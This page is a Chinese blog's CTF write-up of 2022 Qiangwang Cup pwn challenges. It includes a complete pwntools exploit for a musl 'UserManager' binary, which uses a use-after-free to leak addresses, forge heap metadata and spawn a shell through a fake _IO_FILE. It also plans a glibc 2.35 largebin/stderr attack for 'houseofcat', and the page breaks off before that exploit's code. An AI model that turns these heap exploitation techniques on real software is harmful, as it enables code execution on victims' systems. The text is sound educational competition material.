



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="清風微醺" href="https://www.wdqjxtmph.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="清風微醺" href="https://www.wdqjxtmph.top/atom.xml" />
<link rel="alternate" type="application/json" title="清風微醺" href="https://www.wdqjxtmph.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="wp" />


<link rel="canonical" href="https://www.wdqjxtmph.top/2022/08/03/2022qwb/">



  <title>
2022强网杯pwn部分wp - CTF |
Loτυs = 清風微醺 = 凌恒</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">2022强网杯pwn部分wp
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-08-03 17:38:41">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-08-03T17:38:41+08:00">2022-08-03</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>35k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>31 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Loτυs</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://pic.imgdb.cn/item/63c25601be43e0d30eff667d.webp">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 CTF"><span itemprop="name">CTF</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://www.wdqjxtmph.top/2022/08/03/2022qwb/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="Loτυs">
    <meta itemprop="description" content="凌恒, 凌恒山其若陋兮、">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="清風微醺">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h2>
<h3 id="challenge-usermanager"><a class="markdownIt-Anchor" href="#challenge-usermanager">#</a> challenge <strong>UserManager</strong></h3>
<p>菜单题 musl</p>
<p>二叉树</p>
<p>add 里面有 uaf。</p>
<p>连续两次 id 一样。</p>
<p>用的 calloc，得想办法 leak。</p>
<p>堆风水先把 avail chunk 给消耗完。再 free user。 再分配的时候就可以完成用 user 占位 name。然后用 name 来 leak libc 和 elf base</p>
<p>再用 name 反过来占位 user，写 secret 的地址就可以 leak 出 secret。</p>
<p>dequeue 打类似 unlink 攻击，打 io file，fsop。堆风水，注意到 parent 指针会有出现解引用的问题，重新调整一下就可以。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># functions for quick script</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)        </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>,timeout=<span class="number">2</span>:p.recv(numb, timeout=timeout)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop) <span class="comment"># by default, drop is set to false</span></span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># to get 8 byte addr </span></span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"><span class="comment"># gdb debug</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p,a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment"># basic config</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">elf_path    = <span class="string">&quot;UserManager&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf     = ELF(elf_path)</span><br><span class="line"><span class="comment"># libc    = elf.libc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(elf_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;123.56.45.155&#x27;</span>,<span class="number">23014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    sla(<span class="string">&#x27;UserName length: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;UserName: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">META_struct</span>:</span></span><br><span class="line">    BIT_FIELD_BLEN = &#123;</span><br><span class="line">        <span class="string">&#x27;last_idx&#x27;</span>  : <span class="number">5</span>,</span><br><span class="line">        <span class="string">&#x27;freeable&#x27;</span>  : <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;sizeclass&#x27;</span> : <span class="number">6</span>,</span><br><span class="line">        <span class="string">&#x27;maplen&#x27;</span>    : <span class="number">52</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FIELD_NAME = (</span><br><span class="line">        <span class="string">&#x27;prev&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;next&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mem&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;avail_mask&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;freed_mask&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;last_idx&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;freeable&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sizeclass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;maplen&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.__data = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> self.FIELD_NAME:</span><br><span class="line">            self.__data[k] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span>(<span class="params">self, attr, vaule</span>):</span></span><br><span class="line">        <span class="keyword">if</span> attr <span class="keyword">in</span> self.FIELD_NAME:</span><br><span class="line">            self.__data[attr] = vaule</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">super</span>().__setattr__(attr, vaule)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span>(<span class="params">self, attr</span>):</span></span><br><span class="line">        <span class="keyword">if</span> attr <span class="keyword">in</span> self.FIELD_NAME:</span><br><span class="line">            <span class="keyword">return</span> self.__data[attr]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>().__getattr__(attr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__bytes__</span>(<span class="params">self</span>):</span></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="string">&#x27;prev&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;mem&#x27;</span>):</span><br><span class="line">            payload += p64(self.__data[k])</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="string">&#x27;avail_mask&#x27;</span>, <span class="string">&#x27;freed_mask&#x27;</span>):</span><br><span class="line">            payload += p32(self.__data[k])</span><br><span class="line">        bv = <span class="number">0</span></span><br><span class="line">        bpos = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="string">&#x27;last_idx&#x27;</span>, <span class="string">&#x27;freeable&#x27;</span>, <span class="string">&#x27;sizeclass&#x27;</span>, <span class="string">&#x27;maplen&#x27;</span>):</span><br><span class="line">            blen = self.BIT_FIELD_BLEN[k]</span><br><span class="line">            bv |= (self.__data[k] &amp; ((<span class="number">1</span> &lt;&lt; blen) - <span class="number">1</span>)) &lt;&lt; bpos</span><br><span class="line">            bpos += blen</span><br><span class="line">        payload += p64(bv)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span>    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>-<span class="number">2</span>):</span><br><span class="line">        add(i, <span class="number">0x98</span>, <span class="built_in">str</span>(i)*<span class="number">8</span>)</span><br><span class="line">    clear()</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x38</span>,<span class="string">&#x27;aaaaaaa&#x27;</span>) </span><br><span class="line">    </span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x98</span>,<span class="string">&#x27;bbbbbbb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x98</span>, <span class="string">&#x27;oooooooo&#x27;</span>) <span class="comment"># 用user占位4的name</span></span><br><span class="line"></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    r(<span class="number">8</span>)</span><br><span class="line">    libc_base = uu64(r(<span class="number">6</span>))-<span class="number">0xb7a60</span></span><br><span class="line">    leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line">    r(<span class="number">2</span>+<span class="number">8</span>*<span class="number">2</span>)</span><br><span class="line">    elf_base = uu64(r(<span class="number">6</span>))- <span class="number">0x5d80</span></span><br><span class="line">    leak(<span class="string">&#x27;elf_base&#x27;</span>,elf_base)</span><br><span class="line">    z(<span class="string">&#x27;watch * 0x555555559da0&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    secret_offset = <span class="number">0xb4ac0</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x38</span>, p64(<span class="number">4</span>)+p64(libc_base+ secret_offset) +p64(<span class="number">0x38</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0xdeadbeef</span>)) <span class="comment"># 用name反过来占位3的user</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    secret = uu64(r(<span class="number">8</span>))</span><br><span class="line">    leak(<span class="string">&#x27;secret&#x27;</span>,secret)</span><br><span class="line"></span><br><span class="line">    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake start</span></span><br><span class="line">    <span class="comment"># page_addr = libc_base - 0x7000 # noaslr</span></span><br><span class="line">    page_addr = libc_base - <span class="number">0x3000</span> <span class="comment"># aslr</span></span><br><span class="line">    fake_file_addr = libc_base+(<span class="number">0xb7f50</span>) <span class="comment"># addr of fake file struct</span></span><br><span class="line">    ofl_head_addr  = libc_base+(<span class="number">0xb6e48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#  写一个伪造的指针到name，用于任意地址free</span></span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x98</span>, <span class="string">&#x27;oooooooo&#x27;</span>) <span class="comment"># 用user占位4的name,重新做一遍，防止后续parent时出现问题。</span></span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x38</span>, p64(<span class="number">4</span>)+p64(page_addr+<span class="number">0x40</span>) +p64(<span class="number">0x38</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造各种结构体到mmap内存上</span></span><br><span class="line">    fm = META_struct()</span><br><span class="line">    fm.prev = ofl_head_addr-<span class="number">8</span></span><br><span class="line">    fm.<span class="built_in">next</span> = fake_file_addr</span><br><span class="line">    fm.mem  = page_addr+<span class="number">0x30</span></span><br><span class="line">    fm.freeable = <span class="number">1</span></span><br><span class="line">    fm.maplen   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    fake_slot = flat(&#123;</span><br><span class="line">        <span class="number">0</span>    : secret,</span><br><span class="line">        <span class="number">0x8</span>  : <span class="built_in">bytes</span>(fm),</span><br><span class="line">        <span class="number">0x30</span> : page_addr+<span class="number">0x8</span>,</span><br><span class="line">        <span class="number">0x38</span> : <span class="number">0</span>,</span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0xfe0</span>*<span class="string">b&#x27;\x00&#x27;</span> + fake_slot</span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x1300</span>, payload) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger dequeue</span></span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake _IO_FILE</span></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0</span>    : <span class="string">b&quot;/bin/sh\x00&quot;</span>,</span><br><span class="line">        <span class="number">0x28</span> : <span class="number">0xdeadbeef</span>,</span><br><span class="line">        <span class="number">0x38</span> : <span class="number">0xcafebabe</span>,</span><br><span class="line">        <span class="number">0x48</span> : system</span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    add( <span class="number">20</span>, <span class="number">0x78</span>, fake_file) <span class="comment"># 看一下mheapinfo，然后打一个可分配的</span></span><br><span class="line">    pause()</span><br><span class="line">    sl(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start()</span><br><span class="line">exp()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h3 id="challenge-houseofcat"><a class="markdownIt-Anchor" href="#challenge-houseofcat">#</a> challenge <strong>houseofcat</strong></h3>
<p>开局是一个类似于 httpd 的代码快，正确后才能进入堆菜单，这里就不多说了</p>
<p>最开始需要对 is_run [0] 进行初始化为 1：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run(<span class="string">b&#x27;LOGIN | r00t QWBQWXFaadmin\x00 &#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>然后之后每次调用菜单的 pyload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    run(<span class="string">b&#x27;CAT | r00t QWBQWXFa\xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your cat choice:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice))</span><br></pre></td></tr></table></figure>
<p>漏洞出在 delete 有 UAF，有两次 edit 机会，能构造两次 largebin attack (不用修复 largebin 链表，用 0x400 大小域和 0x440 大小域即可）。glibc2.35 的话，由于这道题 stderr 指针在 libc 上（应该是编译时加上了参数，否则正常 stderr 指针不会在 libc 段上）。因此两次 largebin attack 分别打 guard (glibc2.35 指针异或）和 stderr 指针，伪造 stderr 指针结构体即可，最后触发 stderr，调用 setcontext 进行 orw。</p>
<p>这道题本来是很正常的 house of emma，但是我卡在如何触发 stderr。</p>
<p>因为两次 edit 之后，构造了两次 largebin attack 后，没有剩余的 edit 次数了。</p>
<p>以往的 house of emma 都是通过 UAF，先 free 掉一个靠近 top chunk 的 unsortedbin p1，然后申请一个小于原来 p1 的堆块，这样 top chunk 就留在原来那个 UAF 的 p1 里，可以通过 UAF 更改 top chunk size，使其落入 top chunk size 不够分割的情况，这时候就会检查：</p>
<p>此处会对 top_chunk 的 <code>size|flags</code>  进行 assert 判断</p>
<ol>
<li>
<p>old_size &gt;= 0x20;</p>
</li>
<li>
<p>old_top.prev_inuse = 0;</p>
</li>
<li>
<p>old_top 页对齐</p>
</li>
</ol>
<p>然后可触发 malloc_assert，其中的 fxprintf 函数会调用 stderr。</p>
<p>不过这道题我们没有多余的 edit 机会了。</p>
<p>我思考之后，想到一种可能，若 largebin attack 和修改 top chunk size 可以同时进行的话。并且查阅 glibc 源码后发现，处理 largebin attack 部分源码在对 top chunk size 进行判断之前。</p>
<p>参考 CSDN 上一篇关于 house of apple 博客里的堆风水启迪了我：</p>
<p>可以先 malloc 0x480,0x480，(这两都紧挨着 top chunk) 然后都 free 掉，再 add 0x460,0x500 之类的，构造出一个 UAF 指针，指向我们下图中的 chunk3 位置。通过 chunk1 的 edit 功能可以改掉 bk_nextsize 和 chunk3 的 size，那就伪造一下 chunk3 的 size（用 add 函数输入内容伪造，不用 edit），改成 chunk3 距离 top chunk 的距离，然后 free 掉 UAF 的 chunk3 指针，这样就能使 top chunk 合并到 chunk3 附近。</p>
<p>然后就能用 edit 函数同时改 bk_nextsize 和 top chunk size。</p>
<p>然后直接干！</p>
<p><img data-src="https://tvax1.sinaimg.cn/large/008qDYGVly1h4sc3r8bkvj30de0ddwf9.jpg" alt="8e9f0a01ffeca6d662c36a444f077522"></p>
<p>最后沙盒禁用了 execve，只能 orw，但是甚至 read 只能 read fd 为 0 的，因此需要先 close (0)，然后再 orw，新打开的 flag 文件文件描述符为 0。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 